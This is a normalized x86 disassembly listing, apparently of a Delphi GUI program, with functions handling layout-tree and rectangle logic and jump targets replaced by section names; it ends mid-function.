mov edx 0x1
call sub_451734
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
mov edx 0x2
call sub_451734
jmp r-xdata
retn
sub_4516ec
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_4517a0
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
mov edx 0x2
call sub_4517a0
jmp r-xdata
retn
sub_451734
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_451b68
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_4517a0
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_451654
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_451b68
push eax
mov eax esi
call sub_4516a4
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_451b68
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_451850
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_451654
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_451c68
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_4517a0
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_451654
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_4517a0
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_4516a4
mov edx eax
add edx esi
mov eax ebx
call sub_451b90
mov edx edi
mov eax ebx
call sub_451b90
jmp r-xdata
mov eax ebx
call sub_4519f0
mov eax ebx
call sub_451c40
mov ebx eax
test ebx ebx
jne r-xdata
sub_4518f8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_403eb8
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403f0c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
call sub_4038f4
sub_45193c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_403324
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_4519ad
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_449ce4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_4519c0
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_451c40
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_4519f0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_4517a0
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4517a0
mov esi eax
push ebp
call sub_4519c0
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_451c40
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_451734
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_451734
mov ecx ebx
pop edx
call sub_4170ec
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44896c
mov eax [ ebp - 0x4 ]
call sub_451b68
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_451b68
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_451b68
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_451b68
push ebx
mov ebx eax
mov eax ebx
call sub_451670
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_4515f8
test al al
je r-xdata
mov eax ebx
call sub_4516a4
pop ebx
retn
sub_451ba4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_451b90
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_451640
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_451b94
mov edx esi
call sub_451ba4
sub_451be0
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_451b68
mov edi eax
mov eax ebx
call sub_4516a4
cmp edi eax
jl r-xdata
mov eax esi
call sub_451850
mov eax [ esi + 0x1c ]
push eax
push sub_4536f0
mov edx esi
call sub_451f1c
mov eax ebx
call sub_451b68
mov edi eax
mov eax esi
call sub_4516ec
cmp edi eax
jle r-xdata
mov eax ebx
call sub_451be0
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_451c4c
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_451670
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_451c74
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4030f8
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_40348c
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45161c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424890
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_42b858
mov edx eax
mov eax ebx
call sub_424a0c
mov eax [ ebp - 0x4 ]
call sub_451e44
xor eax eax
push ebp
push sub_451d80
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_44c508
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_451850
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451d87
mov eax [ ebp - 0x4 ]
call sub_451e48
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_44c4cc
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_451d87
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_453c18
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_451ddc
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_452e48
mov eax [ esi + 0x10 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_451e5c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_451e5c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_451e5c
pop ecx
sub_451eb4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_451e5c
pop ecx
sub_451ee0
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_451ee0
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_451ee0
pop ecx
sub_451fb8
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_4519f0
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_4170ec
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_44896c
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45161c
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_451eb4
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_451640
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_452ee0
mov edx esi
mov eax ebx
call sub_451eb4
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_448f50
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45161c
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_448f3c
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_4517a0
mov edx eax
mov eax edi
call sub_451b90
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_4517a0
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_4517a0
mov edx eax
mov eax edi
call sub_451b90
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_4517a0
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_4521c8
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_452370
jmp r-xdata
sub_4521c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_45161c
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_451b68
mov edx eax
mov eax ebx
call sub_451b90
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_451b90
mov eax [ esi + 0x64 ]
call sub_451b68
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_453238
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_451f1c
mov eax [ esi + 0x64 ]
call sub_451b68
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_453238
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_451f1c
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_4535bc
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_451f1c
mov eax [ esi + 0x64 ]
call sub_451b68
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_4536f0
xor edx edx
mov eax esi
call sub_451f1c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_451b90
adc edx 0x0
mov eax ebx
call sub_451850
mov eax ebx
call sub_451be0
push esi
push sub_4536f0
xor edx edx
mov eax esi
call sub_451f1c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_452370
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_451850
mov eax [ ebx + 0x14 ]
call sub_451be0
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_4523e8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_451b68
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_451b68
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_451b68
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_451734
mov esi eax
mov edx 0x2
mov eax ebx
call sub_451734
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_451b68
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_451c40
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_451c68
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_451c40
call sub_4523e8
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_451c68
call sub_4523e8
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_4517a0
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_4517a0
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_452614
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
